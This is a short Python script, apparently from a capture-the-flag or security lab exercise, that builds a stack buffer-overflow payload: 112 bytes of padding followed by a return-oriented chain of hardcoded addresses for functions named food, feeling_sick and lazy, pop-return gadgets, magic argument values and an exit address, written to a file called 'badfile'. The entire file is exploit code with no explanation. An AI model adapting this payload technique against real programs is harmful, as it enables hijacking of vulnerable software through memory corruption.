import struct 

food = 0x8048490
feeling_sick = 0x80484ef
lazy = 0x804846b
pop_ret = 0x080484ed
pop_pop_ret= 0x080484ec

magic = 0xdeadbeef
magic1 = 0xd15ea5e
magic2 = 0x0badf00d

exit = 0xb7e337f0

atk_vector = 'a'*112
atk_vector += struct.pack('I', food)
atk_vector += struct.pack('I', pop_ret)
atk_vector += struct.pack('I', magic)
atk_vector += struct.pack('I', feeling_sick)
atk_vector += struct.pack('I', pop_pop_ret)
atk_vector += struct.pack('I', magic1)
atk_vector += struct.pack('I', magic2)
atk_vector += struct.pack('I', lazy)
atk_vector += struct.pack('I', exit)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()



